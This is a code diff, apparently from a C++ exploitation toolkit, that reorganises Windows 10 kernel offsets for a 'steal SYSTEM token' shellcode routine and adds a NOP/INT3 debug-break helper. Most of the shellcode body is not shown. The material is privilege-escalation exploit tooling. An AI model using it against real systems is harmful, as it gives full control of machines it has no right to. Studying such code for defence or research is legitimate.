@@ -1,15 +1,10 @@
 #include "kernel.h"
 
 #include "asm.h"
+#include "log.h"
 
 
-namespace pwn::kernel::shellcode
-{
-	namespace
-	{
-		std::vector<BYTE> __steal_system_token_x64(void)
-		{
-
+#ifndef __KERNEL_CONSTANTS__
 #ifdef __WIN10__
 #define KIINITIAL_THREAD  0x0188
 #define EPROCESS_OFFSET   0x00b8
@@ -25,7 +20,20 @@ namespace pwn::kernel::shellcode
 #define FLINK_OFFSET      0x02e8
 #define TOKEN_OFFSET      0x0348
 #define SYSTEM_PID        0x4
+
 #endif
+#define __KERNEL_CONSTANTS__
+#endif
+
+
+namespace pwn::kernel::shellcode
+{
+	namespace
+	{
+		std::vector<BYTE> __steal_system_token_x64(void)
+		{
+
+
 
 			const char* sc = ""
 				"push rax ;"
@@ -63,5 +71,11 @@ namespace pwn::kernel::shellcode
 #ifdef __x86_64__
 		return __steal_system_token_x64();
 #endif
+	}
+
+
+	std::vector<BYTE> debug_break(void)
+	{
+		return std::vector<BYTE>(  { 0x90, 0x90, 0xcc, 0xcc} );
 	}
 }
